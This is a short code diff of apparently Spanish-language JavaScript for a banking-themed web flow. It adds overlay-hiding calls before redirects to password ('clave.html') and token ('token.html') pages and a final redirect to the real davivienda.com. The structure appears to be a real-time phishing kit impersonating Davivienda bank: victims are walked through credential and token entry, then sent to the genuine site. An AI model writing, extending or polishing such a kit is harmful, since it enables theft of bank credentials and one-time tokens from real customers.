@@ -111,14 +111,17 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
             case 'request_password':
                 console.log('🔐 Redirigiendo a clave.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'clave.html';
                 break;
             case 'request_token':
                 console.log('📱 Redirigiendo a token.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'token.html';
                 break;
             case 'finish':
                 console.log('✅ Finalizando - redirigiendo a davivienda.com');
+                BancoUtils.hideOverlay();
                 window.location.href = 'https://www.davivienda.com/';
                 break;
             default:
